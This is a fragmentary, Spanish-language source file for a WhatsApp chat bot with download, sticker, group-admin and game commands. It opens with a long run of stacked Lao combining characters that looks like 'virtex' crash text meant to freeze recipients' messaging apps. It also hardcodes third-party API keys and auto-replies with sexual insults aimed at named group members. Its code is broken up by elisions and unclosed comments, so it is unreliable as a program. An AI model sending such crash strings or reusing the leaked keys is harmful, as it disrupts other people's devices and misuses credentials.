໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່່່່່່້້້່ີີ່້ິູຸູິິ໌ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້ິ້໌໌໌ີ້ຼຼຼຼຼຼຼຼຼຼຼຼ໋໋໋໋໋໋໋໊໊໊໊໊໊ີ້ີ້ີ້ີ້ີ້ິ້ິີີີີີີ່\n*• Descripcion:*  ${anu2.desc}`
					denz.sendMessage(from, buffer, image, {quoted: mek, thumbnail: tamnel, caption: infomp3})
...
break
                ...
                case 'yt2mp4':
                                    if (!isNsfw) return reply('modo descarga deshabilitado')
						if (args.length === 0) return reply(`Escribe *${prefix}ytmp4 [linkYt]*`)
						...
						try {
							...
							.then((res) => {
								...
								.then((a) => {
								if (Number(filesize) >= 70000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP3\n*Peso* : ${filesizeF}\n*Link* : ${a.data}\n\n_Para la duración excedente del limite de la descarga se presentara solo como enlace YT_`)
								const captions = `❏ *Ytmp4*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP4\n❏ *Peso* : ${filesizeF}\n\n_Video enviandose, espere unos minutos_`
						...
						case 'yts':
						                    if (!isNsfw) return reply('modo descarga deshabilitado')
            if (!args.length) return reply('Nombre?')
            try {
            	reply(mess.wait)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 8})
...
├ ${prefix}ytmp3 o play + [link yt] = Audio
└ ${prefix}ytmp4 + [link yt] = Video`})
            } catch(e) {
                reply(`No pudo encontrar esto o tuvo un error, Error: ${e.message}\n intente nuevamente con otra busqueda!`)
          
            }
            break
					case 'yt2mp3':
					                    if (!isNsfw) return reply('modo descarga deshabilitado')
						if (args.length === 0) return reply(`Escribe *${prefix}ytmp3 [linkYt]*`)
						...
						try {
							...
							.then((res) => {
								...
								const captions = `❏ *YTmp3*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP3\n❏ *Peso* : ${filesizeF}\n\n_El archivo se esta enviando, espere unos minutos_`
								sendMediaURL(from, thumb, captions)
								sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
							})
					        })
...
case 'play':
               ...
               if (anu.error) return reply(anu.error)
                ...
                denz.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                
                break 
                case 'playmp4':
                if (!isNsfw) return reply('modo descarga deshabilitado')
                play = body.slice(9)
                anu = await fetchJson(`https://api.zeks.me/api/ytplaymp4?apikey=apivinz&q=${play}`, {method: 'get'})
               if (anu.error) return reply(anu.error)
                 infomp3 = `「 *TIMELINE PLAY MP4* 」\n*• Título:* ${anu.result.title}\n*• Link:* ${anu.result.source}\n*• Tamaño:* ${anu.result.size}\n\n*ESPERE NUEVAMENTE ENVIANDO POR FAVOR, NO SPAME EL CHAT CSM🖐*`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_video)
                denz.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                /*denz.sendMessage(from, lagu, video, {mimetype: 'audio/mp4', filename: `${anu.title}.mp4`, quoted: mek})*/
                sendMediaURL(from, anu.result.url_video)                
                break 
               /*  case 'ytl':
                let isLinkss = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinkss) return reply(mess.error.Iv)
						play = body.slice(5)
                   tamnel = fs.readFileSync('./denz.jpg')
                   prueba = [`http://api.zekais.com/youtube?url=${play}&apikey=zekais`]
porn = await fetchJson(`${prueba}`, { method: 'get'})
buffer = await getBuffer(`${porn.prueba}`)
         infomp3 = `「 *YTMP* 」\n*• Título:* ${porn.title}\n*• Canal:* ${porn.channel}\n*• Vistas:* ${porn.views}\n*• Likes:* ${porn.likes}\n*• Publicado:* ${porn.published}\n\n
             ${prefix}videoxx = (porn.video.url)
              ${prefix}audioxx = (porn.audio.url)
                  gbutsan = [{buttonId:`${videoxx}`, buttonText:{displayText:'🎥(360p)'},type:1},{buttonId:`audioxx`, buttonText:{displayText:'🎶🎵(128)'},type:1}]
					mhan = await denz.prepareMessage(from, buffer, image, {thumbnail:tamnel})
					mhan1 = await denz.prepareMessage(from, videox, video)
					mhan2 = await denz.prepareMessage(from, audiox, audio)
const buttonMessageytl = {
imageMessage: mhan.message.imageMessage,
videoMessage: mhan1.message.videoMessage,
audioMessage: mhan2.message.audioMessage,
contentText: infomp3,
footerText: 'By Hatori Hanzo',
buttons: gbutsan,
headerType: 4
}
denz.sendMessage(from, buttonMessageytl, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./denz.jpg'), caption: 'Tes', quoted: mek})
break*/
                case 'spotify':
                case 'spod': 
                play = body.slice(9)
                anu = await fetchJson(`https://api-gdr2.herokuapp.com/api/spotifyurl?url=${play}`, {method: 'get'})
               if (anu.error) return reply(anu.error)
                 infomp3 = `「 *SPOTIFY * 」\n*• Título:* ${anu.result.title}\n*• Fecha/Subida:* ${anu.result.date}\n*• Tipo:* ${anu.result.type}\n*• Artista:* ${anu.result.artist}\n*• Link:* ${anu.result.link}\n\n*ESPERE NUEVAMENTE ENVIANDO POR FAVOR, NO SPAME EL CHAT CSM🖐*`
                ...
                case 'spos':
if (!c) return reply('nombre?')
					datas = await fetchJson(`https://api.zeks.me/api/spotify?apikey=apivinz&q=${c}`)
					for (let i of datas.data) {
						teks += `「 *SPOTIFY* 」\n\n`
						teks += `*‣Titulo* : ${i.title}\n`
						teks += `*‣Artista* : ${i.artists}\n`
						teks += `*‣Album* : ${i.album}\n`
                        teks += `*‣Url* : ${i.url}\n usa ,spod + link spotify para descargar el preview\n\n>>>>>>>>>>>>>>>>>>>>>>\n`
                    ...
                    /*  case 'play':
                    if (!isNsfw) return reply('modo descarga deshabilitado')
                            if (args.length === 0) return reply(`Escribe *${prefix}play* _Nombre de la cancion que desea descargar_`)
        					
                            const playy = await axios.get(`https://api.zeks.me/api/ytplaymp3?apikey=apivinz&q=${body.slice(6)}`)
                            const mulaikah = playy.result[0].url_audio
                            try {
                                reply(mess.wait)
                                yta(mulaikah)
                                .then((res) => {
                                    ...
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb,  `❏ *PLAYmp3*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP3\n*Peso* : ${filesizeF}\n*Link* : ${a.data}\n\n_Para la duración excedente del limite de descarga se presentara unicamente como linkyt_`)
                                    const captions = `❏ *YTmp3*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP3\n❏ *Peso* : ${filesizeF}\n\n_Audio enviandose, espere unos minutos_`
								    sendMediaURL(from, thumb, captions)
                                    sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                    })
                                })
                            ...
                            /*case 'playmp4':*/
                                               /* if (!isNsfw) return reply('modo descarga deshabilitado')
                            if (args.length === 0) return reply(`Escriba *${prefix}video* _Nombre del video que desea descargar_`)
                            const playi = await axios.get(`https://api.zeks.me/api/ytplaymp4?apikey=apivinz&q=${body.slice(6)}`) 
                            const mulaihah = playi.result[0].url_video
                            try {
                                reply(mess.wait)
                                ytv(mulaihah)
                                .then((res) => {
                                    ...
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 80000) return sendMediaURL(from, thumb, `❏ *PLAYmp4*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP4\n*Peso* : ${filesizeF}\n*Link* : ${a.data}\n\n_Para la duración excedente del limite de la descarga se presentara solo como enlace YT_`)
                                    const captions = `❏ *YTmp4*\n\n❏ *Título* : ${title}\n❏ *Extensión* : MP4\n❏ *Peso* : ${filesizeF}\n\n_Enviando vídeo, espere unos minutos_`
								    sendMediaURL(from, thumb, captions)
                                    sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                    })
                                })
				...
				case 'sticker':
					...
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							...
							reply(`Sube una imagen/video con ${prefix}s o responde una imagen/video que ya fueron enviados\nNota : Duracion del video, maximo 10 segundos`)
						}
						break
case 'trigger':
					...
					denz.sendMessage(from, buffer, image, {caption : '' ,quoted: mek})
                   }
              break       
...
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
reply(mess.wait)
anu1 = await getBuffer(`https://api.zeks.me/api/burning-image?apikey=apivinz&image=${ger}`, {method: 'get'})
}
denz.sendMessage(from, anu1, sticker, {quoted: mek})
...
reply(mess.wait)
anu1 = await getBuffer(`https://api.zeks.me/api/burning-image?apikey=apivinz&image=${ger}`, {method: 'get'})
sendStickerUrl(from, anu1, {quoted: mek})
}
break  
...
reply(mess.wait)
anu1 = await getBuffer(`https://api.zeks.me/api/burning-image?apikey=apivinz&image=${ger}`, {method: 'get'})
sendMediaURL(from, anu1, {quoted: mek})
...
var m3 = m.split("/")[2]; 
reply(mess.wait)
anu1 = await getBuffer(`https://api.zeks.me/api/missing-image?apikey=apivinz&image=${ger}&text1=${m1}&text2=${m2}&text3=${m3}`, {method: 'get'})
denz.sendMessage(from, anu1, image, {quoted: mek})
}
break  
case 'miss2': 
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
...
reply(mess.wait)
anu1 = await getBuffer(`https://api.zeks.me/api/missing-image?apikey=apivinz&image=${ger}&text1=${m1}&text2=${m2}&text3=${m3}`)
denz.sendMessage(from, anu1, image, {quoted: mek})
...
case 'smeme': 
					...
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length > 0) {
					dger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					owigi = await  denz.downloadAndSaveMediaMessage(dger)
					oanu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owigi)
					oteks = `${oanu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${oteks}`
					smeme = await getBuffer(anu2)
					denz.sendMessage(from, smeme, image, {thumbnail: Buffer.alloc(0)})
					} else {
					reply('Responde una foto!')
					}
					break
					...
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							...
							reply(`Sube una foto/video con *${prefix}swm nombre/author* o etiquetar imagen/video que ya se han enviado\nNota : Duración del video maximo 10 segundos`)
						}
						break
					case 'takestick':
					case 'take':
					case 'robar':
						if (!isQuotedSticker) return reply(`Responde un sticker con el comando *${prefix}take nombre/author*`)
						ppp = `${args.join(' ')}`
			...
			case 'ping':
					...
					reply(`Velocidad: ${latensyi.toFixed(4)} segundos`)
					break
				/*            case 'return':
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					...
					nm = body.slice(12)
					if (!nm) return reply('Nombre del sticker?')
				...
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 ...
					 reply(`sticker eliminado con éxito ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
				...
				case 'liststicker':
					...
					teks += `\n*Total : ${setik.length}*\n\n_Para traer un sticker, responde este mensaje con el nombre que le diste al sticker_`
					...
					nm = body.slice(7)
					if (!nm) return reply('Nombre del audio?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await denz.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					denz.sendMessage(from, `Listo, consulte con *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					...
					reply(`Listo, eliminado vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
				...
				case 'listvn':
					...
					teks += `\n*Total : ${vien.length}*\n\n_Para traer un vn responde este mensaje con el nombre que le dio al vn_`
					denz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedImage) return reply('Responde imagen')
					nm = body.slice(10)
					if (!nm) return reply('Nombre de la imagen?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await denz.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					denz.sendMessage(from, `Listo, imagen añadida, escriba *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 ...
					 reply(`Listo, imagen eliminada ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
				...
				case 'listimage':
					...
					teks += `\n*Total : ${imagi.length}*\n\n_Para traer una imagen, responde este mensaje con el nombre de la imagen_`
			...
			case 'setbio':
				...
				if (args.length < 1) return reply('texto?')
					iyek = body.slice(8)
					denz.setStatus(`${iyek}`)
					reply(`biografia cambiado con éxito a: ${body.slice(8)}`)
					break
					case 'setname':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('texto?')
                ...
                reply(`Nombre cambiado con éxito a: ${body.slice(9)}`)
                break
			case 'add':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Responde a alguien!')
			...
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Responde al participante!')
			kick = mek.message.extendedTextMessage.contextInfo.participant
		    denz.groupRemove(from, [kick])
						reply('eliminado con éxito')
                    break
/*case 'kick':
   case 'ban':
if (!isGroup) return reply(mess.only.group)
			...
			case 'creategrup':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Escriba ${prefix}creategrup nombregrupo/@tag member`)
				argz = arg.split('/')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					...
					reply(`Listo grupo creado ${argz[0]}`)
                }
				break
			case 'addrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Escriba ${prefix}addrespon hola|bien`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Ya esta activo`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Listo, addrespon activado ${argz[0]}`)
				break
			case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Escriba ${prefix}delrespon hola`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`no esta en la database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Listo  ${body.slice(11)}`)
				break
case  'op1':
tujuh = fs.readFileSync('./assets/op1.mp3');
denz.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case  'op2':
...
denz.sendMessage(from, tujuh, MessageType.video, {quoted: mek, mimetype: 'video/mp4', ptt:true})
break
case  'op10':
...
break
case  'rap6':
tujuh = fs.readFileSync('./assets/eminem.mp3');
denz.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
...
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
denz.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Rehusar:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}
...
if (nuber < 1 || nuber > 9) return reply('Ingrese los numero correctamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Ya se lleno')
if (main[0].gilir.includes(sender)) return reply('Espere su turno')
s = '❌'
...
*Yeyyy juego ganado por*@${tty.player1.split('@')[0]}*\n`
ucapan2 = `*🎳Resultado del juegoTictactoe 🎲*
...
Yeyyy Juego ganado por: *@${tty.player2.split('@')[0]}*\n`
...
Turno de: = @${tty.player1.split('@')[0]}`
 ...
 //WEAS DEL GRUPO
		if (messagesD.includes("*nano")){
			denz.updatePresence(from, Presence.composing)
			reply("chupala nano qliao")
	}
	
		if (messagesD.includes("*brynz")){
			denz.updatePresence(from, Presence.composing)
			reply("que rico la chupas brynz")
	}

	
		if (messagesD.includes("*hatori")){
			denz.updatePresence(from, Presence.composing)
			reply(`chupala ${pushname}`)
	}
	...
	if (messagesD.includes("xandao")){
     ...
     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer HHBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/380946910922?text=Hola:)"}}})
	}
    }
    }
    }
